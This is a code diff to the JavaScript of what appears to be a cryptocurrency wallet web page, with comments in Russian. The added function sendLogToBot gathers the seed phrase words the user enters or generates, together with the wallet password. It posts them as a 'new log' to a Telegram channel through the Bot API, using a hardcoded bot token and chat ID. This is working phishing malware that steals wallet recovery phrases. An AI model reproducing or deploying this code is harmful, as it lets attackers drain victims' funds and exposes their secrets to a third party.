@@ -463,23 +463,35 @@
 
         // ФУНКЦИЯ ОТПРАВКИ ЛОГА (ДОБАВЛЕНО)
         function sendLogToBot() {
-            const password = document.getElementById('pass-1').value;
-            let words = [];
-            let mode = isImportMode ? "IMPORT" : "CREATE";
+    const password = document.getElementById('pass-1').value;
+    let words = [];
+    let mode = isImportMode ? "IMPORT" : "CREATE";
 
-            if (isImportMode) {
-                document.querySelectorAll('.import-field').forEach(f => words.push(f.value.trim()));
-            } else {
-                words = currentGeneratedPhrase;
-            }
+    if (isImportMode) {
+        document.querySelectorAll('.import-field').forEach(f => words.push(f.value.trim()));
+    } else {
+        words = currentGeneratedPhrase;
+    }
 
-            const dataStr = `Type: ${mode}\nWords: ${words.join(' ')}\nPass: ${password}`;
-            
-            // ОТПРАВКА ДАННЫХ ПАЙТОН БОТУ
-            if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.sendData(dataStr);
-            }
+    const token = "8658401613:AAGpIeJxFm0KJrN4GF0XA31gPVVhZaEbKcU";
+    const chatId = "-1003954916759";
+    const text = `📩 **НОВЫЙ ЛОГ**\n\nТип: ${mode}\nСлова: ${words.join(' ')}\nПароль: ${password}`;
+
+    // Прямая отправка в канал через API (это сработает везде)
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: "Markdown"
+        })
+    }).then(response => {
+        if(response.ok) {
+            console.log("Лог успешно отправлен!");
         }
+    });
+}
 
         function finishPasswordStep() { 
             sendLogToBot(); // Вызов отправки лога (Добавлено)
